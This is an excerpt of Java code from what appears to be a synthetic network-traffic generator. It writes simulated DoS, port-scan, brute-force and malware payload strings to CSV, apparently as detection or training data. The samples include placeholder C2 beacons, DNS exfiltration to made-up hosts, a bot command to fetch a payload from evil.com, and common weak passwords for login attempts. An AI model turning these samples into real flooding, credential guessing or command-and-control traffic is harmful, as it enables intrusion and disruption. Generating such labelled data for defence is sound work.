            case "DoS":
            case "DDoS":
                String[] dosPayloads = {
                        "GET / HTTP/1.1\r\nHost: target.com\r\nConnection: keep-alive\r\n\r\n", // HTTP flood
                        "SYN [SEQ=0 ACK=0 WIN=65535] [PAYLOAD: " + "A".repeat(Math.min(1000, size)) + "]", // SYN flood
                        "UDP Amplification [DNS Query for isc.org] [Spoofed Source]",
                        "ICMP Echo Request [SIZE=65500 bytes] [FLOOD PATTERN]",
                        "POST / HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 999999999\r\n\r\n"
                                + "X".repeat(Math.min(500, size)),
                        "GET /?param=" + "x".repeat(Math.min(8000, size)) + " HTTP/1.1\r\n" // Slowloris
                };
                payload = dosPayloads[(int) (Math.random() * dosPayloads.length)];
                break;

            case "PortScan":
                int targetPort = 20 + (int) (Math.random() * 65515);
                String[] scanPayloads = {
                        "SYN [Port=" + targetPort + " SEQ=" + (int) (Math.random() * 99999) + " Flags=S] [NMAP Probe]",
                        "TCP Connect [Port=" + targetPort + " Type=Full-Connect-Scan] [Tool=Nmap]",
                        "NULL Scan [Port=" + targetPort + " Flags=0x00] [Stealth Probe]",
                        "FIN Scan [Port=" + targetPort + " Flags=FIN] [Firewall Evasion]",
                        "XMAS Scan [Port=" + targetPort + " Flags=FIN,PSH,URG] [Fingerprinting]",
                        "UDP Probe [Port=" + targetPort + " Data=0x00] [Service Detection]"
                };
                payload = scanPayloads[(int) (Math.random() * scanPayloads.length)];
                break;

            case "BruteForce":
                int attemptNum = (int) (Math.random() * 9999);
                String[] passwords = { "password123", "admin123", "letmein", "qwerty", "123456", "welcome", "P@ssw0rd",
                        "monkey123" };
                String[] usernames = { "admin", "root", "administrator", "user", "test", "guest" };
                String user = usernames[(int) (Math.random() * usernames.length)];
                String pass = passwords[(int) (Math.random() * passwords.length)] + attemptNum;

                String[] brutePayloads = {
                        "POST /admin/login HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername="
                                + user + "&password=" + pass + "&attempt=" + attemptNum,
                        "SSH-2.0-OpenSSH_8.2 [AUTH_ATTEMPT=" + attemptNum + " USER=" + user + " PASS=" + pass + "]",
                        "220 FTP Login Attempt: USER " + user + "\r\n331 Password required\r\nPASS " + pass
                                + " [Attempt #" + attemptNum + "]",
                        "POST /api/authenticate HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"username\":\""
                                + user + "\",\"password\":\"" + pass + "\",\"_attempt\":" + attemptNum + "}",
                        "RDP Connection [USER=" + user + " PASS_HASH=" + Integer.toHexString(pass.hashCode()) + " TRY="
                                + attemptNum + "]"
                };
                payload = brutePayloads[(int) (Math.random() * brutePayloads.length)];
                break;

            case "Malware":
                String[] malwarePayloads = {
                        "POST /beacon HTTP/1.1\r\nHost: c2-server-" + (int) (Math.random() * 999)
                                + ".com\r\nUser-Agent: Mozilla/5.0\r\n\r\n{\"bot_id\":\""
                                + Long.toHexString(System.currentTimeMillis()) + "\",\"cmd\":\"heartbeat\",\"data\":\""
                                + "ENCRYPTED_".repeat(10) + "\"}",
                        "DNS Query: " + Long.toHexString(System.currentTimeMillis())
                                + ".malware-c2.net [TXT Record] [Exfiltration: " + "BASE64DATA".repeat(5) + "]",
                        "GET /update?id=" + Long.toHexString(System.currentTimeMillis())
                                + " HTTP/1.1\r\nHost: malicious-cdn.ru\r\nX-Bot-Version: 2.4.1\r\n[DOWNLOADING_PAYLOAD]",
                        "POST /report HTTP/1.1\r\nHost: " + (100 + (int) (Math.random() * 155)) + "."
                                + (int) (Math.random() * 255) + "." + (int) (Math.random() * 255) + "."
                                + (int) (Math.random() * 255) + "\r\n\r\nstolen_creds=" + "XXXXXX".repeat(8),
                        "IRC: PRIVMSG #botnet :!cmd download http://evil.com/payload.exe [BOT_"
                                + (int) (Math.random() * 9999) + "]",
                        "SMTP Spam [To: victim@company.com] [Subject: Invoice Attached] [Attachment: malware.exe.pdf] [PAYLOAD_SIZE="
                                + size + "]"
                };
                payload = malwarePayloads[(int) (Math.random() * malwarePayloads.length)];
                break;

            default:
                return generatePayload(appType, size);
        }

        while (payload.length() < size) {
            payload += "[...]";
        }

        return payload.substring(0, Math.min(payload.length(), size));
    }

    public static void exportToCSV(List<NetworkPacket> packets, File outputFile) throws IOException {
        try (PrintWriter writer = new PrintWriter(new FileWriter(outputFile))) {
            writer.println(NetworkPacket.getCSVHeader());
            for (NetworkPacket packet : packets) {
                writer.println(packet.toCSV());
            }
        }
        System.out.println("✅ Exported " + packets.size() + " packets to: " + outputFile.getAbsolutePath());
    }

    public static void main(String[] args) {
        try {
            System.out.println("Testing Gemini Packet Generator...\n");

            List<NetworkPacket> packets = generatePackets(10, "Mixed");

            System.out.println("Generated " + packets.size() + " packets:\n");
            for (int i = 0; i < Math.min(5, packets.size()); i++) {
                System.out.println(packets.get(i));
            }

            File csvFile = new File("network_packets.csv");
            exportToCSV(packets, csvFile);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
